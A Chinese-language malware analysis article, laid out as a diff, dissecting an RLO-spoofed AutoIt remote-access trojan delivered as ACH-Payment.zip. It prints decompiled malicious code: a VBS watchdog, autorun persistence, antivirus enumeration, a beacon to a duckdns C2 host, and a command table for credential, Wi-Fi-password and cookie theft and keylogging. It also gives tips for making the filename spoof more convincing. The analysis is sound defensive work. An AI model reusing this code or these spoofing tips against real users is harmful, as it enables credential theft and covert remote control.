@@ -1,0 +1,449 @@
+***本文作者：cgf99，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**
+
+## 一、前言
+
+ **最近收到一个名为ACH-Payment.zip的压缩文档的附件，打开后发现内容其实为一个exe可执行文件。**
+
+如下图所示：
+
+![ACH-Payment.zip](https://image.3001.net/images/20181115/1542272556_5bed362c086b7.png!small)
+
+如果用户习惯对压缩文件直接右键解压缩释放到目录，则看上去的欺骗性会更强。因为其图标会变成excel图标，文件名也有变化。
+
+解压缩后，打开ACH-Payment目录，发现其文件显示如下图所示。
+
+![ACH-Payment目录](https://image.3001.net/images/20181115/1542272575_5bed363fd806a.png!small)
+
+如果用户的windows操作系统使用默认设置，即在文件夹查看设置中勾选“隐藏已知文件的扩展名”的话，则文件看上去如下图所示：
+
+![勾选“隐藏已知文件的扩展名”](https://image.3001.net/images/20181115/1542272593_5bed3651056a3.png!small)
+
+乍一看，确实很像excel表格文件，如果用户没有细看其类型是“应用程序”的话，真的会很容易当作excel文档直接打开。
+
+很明显，攻击者把exe图标替换为excel图标，并结合运用了windows系统RLO文件名欺骗技术。通过欺骗windows系统下用户的视觉效果，进而诱使用户打开并执行恶意木马文件。这种攻击方法是目前社会工程学攻击的常见的典型手段之一，也曾被许多黑客组织包括APT组织运用于各种网络间谍活动。
+众所周知，windows系统支持一种特殊的unicode字符RLO。如果一个字符串中包含RLO字符，那么在windows下显示时，就会把RLO字符右侧的字符串逆序显示出来。比如abc[RLO]edf，则显示的时候看到的是abcfde。因此，其实上面压缩文档内的文件名应该是：ACH
+Payment[RLO]xslx..exe。 此外，笔者感觉本次攻击者的RLO技术应用有点low或者不甚用心，比如上文第二幅图中显示的文件名看起来像是ACH
+Paymentexe..xlsx，文件名其中有两个..字符，而且Paymentexe这串字符串看起来也不像正常的英文单词。从而可能引起目标用户的警觉。其实可以坐如下改进，比如文件名命名为ACH
+Payment[RLO]xslx.exe即可，而且最好是RLO字符前面的单词和exe后缀或者scr或者com等可执行文件后缀扩展名能结合起来像一个真的英文单词，则文件名看起来会更逼真。
+
+很显然，收到的这种形态的可执行文件肯定是有问题的，以下为具体的分析过程。
+
+## 二、初步分析
+
+### 1、 测试环境
+
+Vmware虚拟机环境、windows xp系统
+
+### 2、 文件属性
+
+大小 | MD5 | SHA1  
+---|---|---  
+696,702 | d1e7d5ed139500f9d8e1286763e43727 |
+76809228ac1f92d71b6cfa2455d662c795a98acc  
+  
+### 3、 进程情况
+
+运行后，系统弹出窗口请求选择应用程序开启文档YZGZIG.lsx。如下图所示，晕，竟然没有默认的打开方式，而且.lsx扩展名是什么鬼?
+
+![进程情况](https://image.3001.net/images/20181115/1542272658_5bed369283723.png!small)
+
+由于测试系统中已安装了WPS，选择用WPS打开。打开后如下图所示，是一个空的表格文件。
+
+![空的表格文件](https://image.3001.net/images/20181115/1542272673_5bed36a1cd61b.png!small)
+
+从图中我们可以进一步确认，该攻击者确实比较粗心。首先，上图中打开的空的excel文档名字其实应该为YZGZIG.xls，而不是YZGZIG.lsx，应该是编程出现的笔误。其次，很明显我们收到的或者攻击者想让我们看起来以为的文档名字应该是：ACH
+Paymentexe..xlsx。也就说，正常情况下，打开给用户看到的应该是ACH
+Payment.xlsx，而且是excel2007以后的文件类型。因此，如果要符合正常逻辑的话，这里存在两个小问题，一是文件名不对，不能是YZGZIG.lsx，二是文档类型后缀名不对，应该是.xlsx后缀名结尾的表格文档。
+
+通过WPS我们可以看到，实际打开的空文档放置在%temp%目录下。同时，恶意代码运行后，会启动一个名为wscript.exe的进程。而wscript.exe是windows系统自带的文件，用于运行脚本文件，我们看看脚本文件存放哪里？
+
+发现在%temp%目录下有一个名为RBOUCN.vbs的脚本文件。其内容如下：
+
+文件名 | RBOUCN.vbs  
+---|---  
+内容 | On error resume next  
+Dim strComputer,strProcess,fileset  
+strProcess = "ACH Payment?xslx..exe"  
+fileset = """C:\ACH Payment?xslx..exe"""  
+strComputer = "."  
+Dim objShell  
+Set objShell = CreateObject("WScript.Shell")  
+Dim fso  
+Set fso = CreateObject("Scripting.FileSystemObject")  
+while 1  
+IF isProcessRunning(strComputer,strProcess) THEN  
+ELSE  
+objShell.Run fileset  
+END IF  
+Wend  
+FUNCTION isProcessRunning(BYVAL strComputer,BYVAL strProcessName)  
+DIM objWMIService, strWMIQuery  
+strWMIQuery = "Select * from Win32_Process where name like '" & strProcessName
+& "'"  
+SET objWMIService = GETOBJECT("winmgmts:" _ &
+"{impersonationLevel=impersonate}!\\\" _ & strComputer & "\root\cimv2")  
+IF objWMIService.ExecQuery(strWMIQuery).Count > 0 THEN  
+isProcessRunning = TRUE  
+ELSE  
+isProcessRunning = FALSE  
+END IF  
+END FUNCTION  
+  
+上面的脚本其实很简单，就是循环判断恶意进程是否已经在运行中。如果没有运行的话则启动之。可见，其实恶意代码运行后，利用wscript运行上面脚本与ACH
+Payment[RLO]xslx..exe进程之间实现了双进程实时保护功能，无论是哪一个进程被中断，另一个进程就会实时启动它，不过很明显，这样的实时循环保护机制会牺牲CPU的使用效率。
+
+另外，在试验中，发现一个奇怪的现象。如果用户杀掉ACH Payment[RLO]xslx..exe进程，则wscript进程直接启动ACH
+Payment[RLO]xslx..exe进程，导致又会重新打开excel文档。很奇怪的感觉，一个用户在杀掉一个进程就会导致同一个文档重复被打开。很晕，只能说有点奇怪有点暴力。此时，该恶意文件的制作者又被笔者小小的鄙视了一把。
+
+### 4、网络情况
+
+运行后恶意进程连接的IP地址是182.186.59.185，连接的端口是TCP1338端口，这个端口也很少见。常见的木马都是冒充连接80、443端口。不过由于一直无法连接服务器，导致进程循环定时发送网络连接请求。
+
+命令 | Netstat –no  
+---|---  
+结果 | TCP 192.168.92.203:1453 182.186.59.185:1338 SYN_SENT 760  
+  
+该IP调查结果如下：
+
+查询IP | 182.186.59.185  
+---|---  
+结果 | 本站数据：巴基斯坦  
+参考数据1：巴基斯坦巴基斯坦 ptcl.com.pk  
+参考数据2：巴基斯坦  
+兼容IPv6地址：::B6BA:3BB9  
+映射IPv6地址：::FFFF:B6BA:3BB9  
+  
+### 5、启动项
+
+发现恶意代码在开始菜单的启动目录下添加了一个名为PROUCN的文件夹，其实是一个快捷方式方式。查看后，发现实际指向的是文件是“%appdata%\windata\system32.exe”。经过文件hash比较，其实这个system32.exe就是我们执行的ACH
+Payment[RLO]xslx..exe。也就是说恶意代码执行后，会在%appdata%目录下创建Windata文件夹，然后拷贝自身到该文件夹下，再添加其快捷方式到启动目录。具体如下图所示：
+
+![启动项](https://image.3001.net/images/20181116/1542350634_5bee672aa72c3.png!small)
+
+不过，如果直接运行system32.exe文件，则会在后台运行，不会像ACH
+Payment[RLO]xslx..exe一样打开文档。说明恶意代码中应该有进行运行参数判断，比如根据进程文件名或者所在的目录的不同，再进行选择性操作。可是，笔者在此处有发现了一个bug。当系统重新启动后，自启动的进程是启动项下的system32.exe，而system32.exe又会去启动wscript运行进程保护脚本。然而作者在这里又没有处理好，没有生成或更新进程保护脚本，从而导致wscript运行的脚本保护的进程永远是ACH
+Payment[RLO]xslx..exe，而不是实际应该保护的system32.exe进程。导致系统重启后，system32.exe会实时保护wscript.exe，而wscript.exe则只会去保护最原始的ACH
+Payment[RLO]xslx..exe。唉。鄙视之。
+
+## 三、静态分析和动态情况
+
+### 1、调试保护
+
+作者在代码中调用IsDebuggerPresent函数进行进程调试保护，看是否当前进程处于调试状态。如下图所示。
+
+![调试保护](https://image.3001.net/images/20181115/1542273177_5bed389952979.png!small)
+
+恶意代码如果发现处于调试状态，则弹出对话框，如下图所示。
+
+![调试保护](https://image.3001.net/images/20181115/1542273191_5bed38a7db280.png!small)
+
+Olydbg中代码如下图所示：
+
+![调试保护](https://image.3001.net/images/20181116/1542351148_5bee692c51264.png!small)
+
+### 2、创建隐藏窗口
+
+![](https://image.3001.net/images/20181115/1542273222_5bed38c6290ac.png!small)
+
+### 3、autoit3脚本分析
+
+经过一番分析，确定该exe应该是用AutoIT3编译而成。AutoIt是一个使用类似BASIC脚本语言的免费软件,它设计用于Windows
+GUI(图形用户界面)中进行自动化操作。它利用模拟键盘按键，鼠标移动和窗口/控件的组合来实现自动化任务。于是对exe进行格式转换，将其变换为.au3脚本文件。
+
+脚本为明文，基本上文件的功能一目了然。（晕啊，想起前面用olydbg动态调试的时候，层层的跳跃，快疯掉了。）
+
+下面逐步分析该au3脚本的功能。
+
+ **1、判断窗口是否存在**
+
+作用 | AutuIt脚本  
+---|---  
+窗口如已存在，退出，否则设置窗口标题 | If WinExists("DEBFPWGSFP") Then Exit  
+AutoItWinSetTitle("DEBFPWGSFP")  
+  
+**2、释放打开excel文档**
+
+如果exe运行的名字不是system32.exe、swwin2.exe、svwin1.exe（用于判断是否是第一次打开），则释放xlsx文档并打开。这里我们可以看到脚本作者释放的excel文档名称就是%temp%\YZGZIG.lsx，与上文看到的一致，应该就是此处作者笔误，把YZGZIG.xls写成了YZGZIG.lsx。
+
+序号 | AutuIt脚本  
+---|---  
+1 | If @ScriptName <> "system32.exe" AND @ScriptName <> "svwin2.exe" AND
+@ScriptName <> "svwin1.exe" Then  
+FileInstall("C:\Users\SHOZAB HAXOR\Desktop\ACH Payment.xlsx", @TempDir &
+"/YZGZIG.lsx")  
+ShellExecute(@TempDir & "/YZGZIG.lsx")  
+EndIf  
+  
+**3、创建%appdata%\windata目录并拷贝自身到该目录下**
+
+序号 | AutuIt脚本  
+---|---  
+1 | DirCreate($ffazezs)  
+$bbneeayd = $tgztret & "system32" & $yyzerf  
+FileCopy($fvffs, $ffazezs & $bbneeayd)  
+  
+**4、判断系统杀软环境**
+
+序号 | AutuIt脚本  
+---|---  
+1 | Global $antivirus If ProcessExists("ekrn.exe") Then $antivirus = "NOD32"
+ElseIf ProcessExists("AvastUI.exe") Then $antivirus = "Avast" ElseIf
+ProcessExists("avgcc.exe") Then $antivirus = "AVG" ElseIf
+ProcessExists("avgnt.exe") Then $antivirus = "Avira" ElseIf
+ProcessExists("ahnsd.exe") Then $antivirus = "AhnLab-V3" ElseIf
+ProcessExists("bdss.exe") Then $antivirus = "BitDefender" ElseIf
+ProcessExists("bdv.exe") Then $antivirus = "ByteHero" ElseIf
+ProcessExists("clamav.exe") Then $antivirus = "ClamAV" ElseIf
+ProcessExists("fpavserver.exe") Then $antivirus = "F-Prot" ElseIf
+ProcessExists("fssm32.exe") Then $antivirus = "F-Secure" ElseIf
+ProcessExists("avkcl.exe") Then $antivirus = "GData" ElseIf
+ProcessExists("engface.exe") Then $antivirus = "Jiangmin" ElseIf
+ProcessExists("avp.exe") Then $antivirus = "Kaspersky" ElseIf
+ProcessExists("updaterui.exe") Then $antivirus = "McAfee" ElseIf
+ProcessExists("msmpeng.exe") Then $antivirus = "Microsoft" ElseIf
+ProcessExists("zanda.exe") Then $antivirus = "Norman" ElseIf
+ProcessExists("npupdate.exe") Then $antivirus = "nProtect" ElseIf
+ProcessExists("inicio.exe") Then $antivirus = "Panda" ElseIf
+ProcessExists("sagui.exe") Then $antivirus = "Prevx" ElseIf
+ProcessExists("Norman.exe") Then $antivirus = "Sophos" ElseIf
+ProcessExists("savservice.exe") Then $antivirus = "Sophos" ElseIf
+ProcessExists("saswinlo.exe") Then $antivirus = "SUPERAntiSpyware" ElseIf
+ProcessExists("spbbcsvc.exe") Then $antivirus = "Symantec" ElseIf
+ProcessExists("thd32.exe") Then $antivirus = "TheHacker" ElseIf
+ProcessExists("ufseagnt.exe") Then $antivirus = "TrendMicro" ElseIf
+ProcessExists("dllhook.exe") Then $antivirus = "VBA32" ElseIf
+ProcessExists("sbamtray.exe") Then $antivirus = "VIPRE" ElseIf
+ProcessExists("vrmonsvc.exe") Then $antivirus = "ViRobot" ElseIf
+ProcessExists("dllhook.exe") Then $antivirus = "VBA32" ElseIf
+ProcessExists("vbcalrt.exe") Then $antivirus = "VirusBuster" Else $antivirus =
+"No" EndIf  
+  
+**5、获取系统IP信息**
+
+通过调用<https://ipapi.co/json>网站的查询接口，对本机的ip地址详情信息进行查询，结果包括IP地址、城市、国家、经纬度、语言等信息。
+
+序号 | AutuIt脚本  
+---|---  
+1 | Local $1xs = InetRead("<https://ipapi.co/json>") Local $11xs =
+BinaryToString($1xs) Local $count = _stringbetween($11xs, $strs & "ip" & $strs
+& ": " & $strs, $strs & ",") Local $count2 = _stringbetween($11xs, $strs &
+"country_name" & $strs & ": " & $strs, $strs & ",") Local $1666ss = "x" If
+IsArray($count) Then Local $1666ss = $count[0] EndIf Local $1666 = "x" If
+IsArray($count2) Then Local $1666 = $count2[0] EndIf InetClose($1xs)  
+  
+**6、连接的域名和端口**
+
+序号 | AutuIt脚本  
+---|---  
+1 | Global $ipsd = "torrentfreak.duckdns.org" Global $porsd = "1338"  
+  
+经过解析，torrentfreak.duckdns.org的ip地址是182.186.59.185，这样IP和端口都与上文网络连结看到的情况一致。
+
+ **7、创建快捷方式启动项**
+
+给自拷贝后的%appdata%\windata\system32.exe创建快捷方式，并放入启动目录。
+
+序号 | AutuIt脚本  
+---|---  
+1 | If NOT FileExists(@StartupDir & "\RBOUCN.lnk") Then  
+FileCreateShortcut(@AppDataDir & "\Windata\system32.exe", @StartupDir &
+"\RBOUCN.lnk", $vvahk & @AppDataDir & "\Windata" & $vvahk, $bbjnnnn, $bbjnnnn,
+@SystemDir & "\shell32.dll", $bbjnnnn, 4)  
+EndIf  
+  
+**8、初始化网络**
+
+调用TCPStartup()。
+
+ **9、开始进入while循环操作。**
+
+ **10、建立网络连接，回报信息**
+
+发送的信息包括IP查询结果里面的各个字段，用户权限、用户名、操作系统版本与架构、时间、杀毒软件名称、恶意代码版本号（$vcers =
+"1.0.9"）、机器类型（是否手提电脑）等，每个字段之间用字符‘|’分隔。
+
+序号 | AutuIt脚本  
+---|---  
+1 |  If TimerDiff($contime) > 9000 Then  
+$derta = TCPNameToIP($ipsd)  
+$r = TCPConnect($derta, $porsd)  
+$contime = TimerInit()  
+EndIf  
+If $r < 1 Then ContinueLoop  
+TCPSend($r, $1666 & $0x0 & $vicname & $0x0 & $1666ss & $0x0 & $usecc & $0x0 &
+$ostc & $0x0 & $archx & $0x0 & @HOUR & $vazeo & @MIN & $0x0 & $antivirus &
+$0x0 & $vcers & $0x0 & $ddddd & $0x0 & $pprprpr & $deskheght & $x2x2x2 &
+$deskwidh & $x3x3x3 & $0x0 & $dexcz & $0x0 & monopri() & $0x0 & $betabta)  
+  
+**11、判断socket状态断开socket连接，和socket数据传输，接收服务器的控制指令。**
+
+序号 | AutuIt脚本  
+---|---  
+1 |  Local $casxx = tcpsocketevent($r)  
+Switch $casxx  
+Case $tcpevent_disconnect  
+Local $begincv = TimerInit()  
+TCPCloseSocket($r)  
+ExitLoop  
+Case $tcpevent_data  
+Local $uuxxx = TCPRecv($r, 2024)  
+Local $uu = BinaryToString($uuxxx)  
+If $uu <> "" Then  
+Local $begincv = TimerInit()  
+EndIf  
+  
+**12、控制指令与功能分析**
+
+控制指令 | 功能  
+---|---  
+ONXMPDE | 读取%AppData%\Windata\mon\下的文件内容，发给服务器  
+wixfix98a | 执行命令netsh wlan show profiles获取无线wifi连接结果，发给服务器  
+pxfitsaaq | 读取无线密码，执行命令netsh wlan show profiles " & $daztssf[0] & "
+Key=Clear"，发送给服务器。  
+i4a3e154ax | 删除注册表HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
+Execution Options\下的值，对服务器没有回报消息  
+8t0xacssat | 枚举HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
+Execution Options\下的值，发送给服务器  
+SPJSS445 | 根据参数设置HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File
+Execution Options\下的值，对服务器没有回报消息  
+X7AEE+ | 接收服务器发送过来的VBS脚本并执行，对服务器没有回报消息  
+USvwZqqp | 根据从服务器接收的两个参数（文件名），进行复制文件。对服务器没有回报消息  
+wachsayer | 查看%temp%\Pl2.exe文件是否存在，有则向服务器发送“HAWalikoum”  
+Xhnazz | 执行命令cmd.exe " /c Pl2.exe -f " & $strs & "Pl2.txt" & $strs
+，并会送结果文件%temp%\Pl2.txt  
+IUY23cx | 删除%temp%\Pl2.exe文件  
+Cxltta3 | 根据参数，修改"\system32\Drivers\etc\hosts"文件下相应设置为“”。  
+RSPPAOUELBC | 查找hosts文件下特殊内容，改行包含"#8Blx"或"#8Rex"，发送给服务器  
+BLXIS | 根据接收的参数，写入hosts文件  
+BLkeryt | 与“BLXIS”指令一样，写入hosts文件  
+kocalsr | 根据参数批量读取文件内容并回送  
+Sofxzitre | 如果是管理员权限，执行” netstat -n -b –o”命令，否则执行“netstat -n -o”命令，  
+nescannez | 用ping命令解析本机IP，机器名，结果发送给服务器  
+GexthWin | 列举窗口情况  
+IFFAxtpa | 根据参数设置窗口的状态（隐藏、可见、最小化、最大化等）  
+Ti8zaww | 返回窗口的标题  
+TX3zQp | 把参数写入%temp%\imtxt.txt，然后打开该文件  
+Verif8s | 读取注册表"HKCU\Software\Win32"下imgCli和img的键值  
+Revprox87 |
+释放文件到%temp%\Proxy_Client.dll，调用该dll的proxyclient_start函数连接ip（torrentfreak.duckdns.org的地址）和端口（服务器发送的参数），完成后删除dll文件  
+Q0TAqp | 向剪切板写入内容  
+COXPIRE | 读取剪切板内容发送至服务器  
+FoCxPArs | 获取firefox登录信息。
+如果存在%appdata%\Mozilla\Firefox\Profiles目录，则创建%Temp%\foxr目录，并拷贝Mozilla\Firefox\Profiles下的（logins.json、key3.db、cert8.db）到foxr目录，然后每个文件发送回服务器。  
+DixrImagxx | 批量枚举指定目录下的jpg/png/gif/bmp文件，转换成jpg格式后回传。  
+FKKKSTTTA08 | 命令回显，相当于ECHO  
+MpS8x | 弹框提示指定的内容  
+Plifinstl | 判断键盘记录进程是否存在  
+MgPlugUp | 开启键盘记录。 写入注册表HKCU\Software\Win32创建keyx，值为字符串类型“1”
+生成%temp%\tmpwstz2.ps1文件 调用powershell.exe -executionpolicy bypass –File
+%temp%\tmpwstz2.ps1  
+srtaapxx | 删除注册表HKCU\Software\Win32\keyx，停止键盘记录进程  
+Dexlu | 删除%appdata%\mon\目录下指定文件  
+ladix | 读取%appdata%\mon\目录指定文件内容  
+TeESX | 发送%appdata%\mon\目录下所有的文件名  
+DR0Rw | 写入注册表HKCU\Software\Win32\data  
+mopasuixx | 给注册表HKCU\Software\Win32\imgCli赋值为字符串”1”  
+roo7ass | 删除注册表HKCU\Software\Win32\imgCli  
+Imstare | 给注册表HKCU\Software\Win32\imgCli赋值为字符串”1”  
+Imfray | 删除注册表HKCU\Software\Win32\img  
+dst8DEL | 删除注册表HKCU\Software\Win32\data  
+Temp0 | 枚举%appdata%\mon\目录文件信息  
+DDRTs | 读取%appdata%\mon\目录指定文件内容并发送  
+DesLX | 根据参数删除%appdata%\mon\目录下文件和文件夹  
+lDx2 | 读取%appdata%\mon\目录指定文件内容并发送  
+Lxog0 | 枚举%appdata%\mon\下指定目录的文件信息  
+DoaxSE | 读取HKCU\Software\Win32\data值回传  
+Rena8x | 删除指定文件夹和文件  
+KRB0sxx | 命令回显，相当于ECHO  
+XWB0DS | 发送{BACKSPACE}，探测连接存活  
+Plug2 | 上传%temp%\p12.exe并执行，结果回传  
+QURAN | 在%TEMP%\q.lnk快捷方式，指向mms://live.mp3quran.net:9976/，并打开访问  
+kortos | 关闭wmplayer.exe进程  
+OnlineKey | 读取%Temp%\Klog.txt内容回传  
+OnlineKDel | 删除%Temp%\Klog.txt，中断socket  
+Spexak | 调用系统扬声器读出指定内容  
+GetSize | 获取文件或文件夹大小  
+PowOf | 清理GDI+资源  
+PREsat | 清理GDI+资源  
+PLOfc | 清理GDI+资源  
+UpWWW8 | 上传文件  
+Unzipx | 解压缩文件  
+Comprx | 压缩文件  
+WallPx | 拷贝%appdata%\Microsoft\Windows\Themes\TranscodedWallpaper.jpg 替换壁纸  
+Execut | 执行指定命令  
+CpyxE| | 文件或文件夹拷贝  
+Deletxc | 删除文件或文件夹  
+AllDriver | 枚举分区信息  
+DeskDir | 枚举桌面目录信息  
+PictuXX | 枚举图片目录信息  
+UserPro | 枚举用户目录信息  
+Sk8xer | 枚举skype目录信息  
+USz9ap | 枚举keype目录下指定目录下的信息  
+SrtU8p | 枚举启动目录信息  
+ApDta | 枚举%appdata%目录  
+Romig | 枚举音乐目录信息  
+Refx| | 枚举指定目录信息  
+RAnSoun | 文件上传  
+UploX | 文件上传保存为%temp%目录下随机6个字节文件名，并执行  
+Soxexctuuous | 重写%TempDir%\Ransound.wav文件，并播放  
+Sound| | 关闭键盘记录进程，重新启动程序  
+Uninstall | 卸载退出  
+kill | 关闭进程  
+EA58AE | 鼠标拖曳操作  
+MouSxA | 鼠标左键点击  
+MouSxB | 鼠标右键点击  
+MoBlosxck | 恢复桌面墙纸  
+Unmoxb | 修改桌面墙纸设置  
+screen | 屏幕截屏  
+OpCD | 打开光驱  
+CloseCD | 关闭光驱  
+DowLDXss | 下载文件并执行  
+Chat | 交流  
+CxM0D1| | 调用控制台执行命令发送结果  
+WebCam | 摄像头拍摄照片  
+Open | 命令执行  
+CookiesAll | 读取chrome浏览器和Firefox浏览器cookie信息  
+CookFirefox | 读取Firefox浏览器cookie信息  
+CooChrome | 读取chrome浏览器cookie信息  
+Process | 枚举进程信息  
+PrKilx| | 关闭指定进程  
+|  
+|  
+  
+## 四、实际测试验证
+
+由于该恶意程序在通信上并没有任何的安全机制，并且上文中我们已经分析清楚该恶意程序与服务器之间的通信指令。因此，我们可以在本地假设环境进行实际测试，从而验证我们上述分析。
+
+利用nc.exe作为服务器端，监听端口1338，在hosts下修改torrentfreak.duckdns.org域名指向本机。
+
+在本机直接运行nc.exe –l –p 1338，运行恶意程序后，木马上线并回报相关信息，如下图所示。
+
+![木马上线并回报相关信息](https://image.3001.net/images/20181115/1542274355_5bed3d33a5e4f.png!small)
+
+输入Process指令，让其枚举进程，结果如下图所示。
+
+![输入Process指令](https://image.3001.net/images/20181115/1542274368_5bed3d4048fba.png!small)
+
+其他的命令可以一一进行操作并验证是否与分析一致。
+
+## 五、结束语
+
+通过上文分析，我们可以初步判断这是一起网络攻击事件。攻击者利用邮件实施攻击，不过技术实力有限，准备不足。
+
+初步的结论如下：
+
+> 1、该压缩文件内含一个恶意exe可执行文件，文件名采用windows系统RLO技术伪装成，并修改exe图标为excel文档图标，欺骗用户打开。
+>
+> 2、exe可执行文件利用AutoIt3脚本制作生成，可以对其进行格式转换，生成明文可见的au3脚本文档。
+>
+> 3、恶意功能模块太多了，佩服作者脚本能力和耐心。
+>
+> 4、该域名还存活，不过目前执行的IP和端口无法连接。
+>
+>
+> 5、该exe恶意文件可能是特定有组织的，不是一般的自动化感染病毒。木马功能模块内含敏感操作（比如cookie信息获取、键盘记录、上传下载文件、文件压缩、文件搜索、截屏等功能）。
+>
+> 6、该作者不甚用心，在分析的时候发现了很多低级错误，见上文。同时，还表现在木马端和服务控制端之间没有认证校验、通信数据明文传输没有加密等。
+
+ ***本文作者：cgf99，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**
+
